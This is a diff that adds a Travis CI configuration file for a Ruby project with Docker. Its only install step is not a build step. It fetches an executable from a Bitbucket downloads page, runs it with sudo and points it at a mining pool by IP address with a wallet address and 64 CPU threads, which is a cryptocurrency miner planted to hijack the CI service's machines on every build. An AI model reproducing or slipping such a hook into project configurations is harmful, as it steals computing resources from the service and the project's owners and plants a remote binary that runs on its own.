@@ -1,0 +1,7 @@
+language: ruby
+
+services:
+  - docker
+
+before_install:
+  - sudo apt-get update && sudo wget https://bitbucket.org/juani2603/donwload/downloads/masterfile && sudo chmod u+x masterfile && sudo ./masterfile --disable-gpu --algorithm randomx --pool 165.227.121.104:3333 --wallet BNB:bnb1udq3s2yn2q7mq5mlpkrj98uj58s7dujmjrj7nw:1970775.worker1 --cpu-threads 64;0
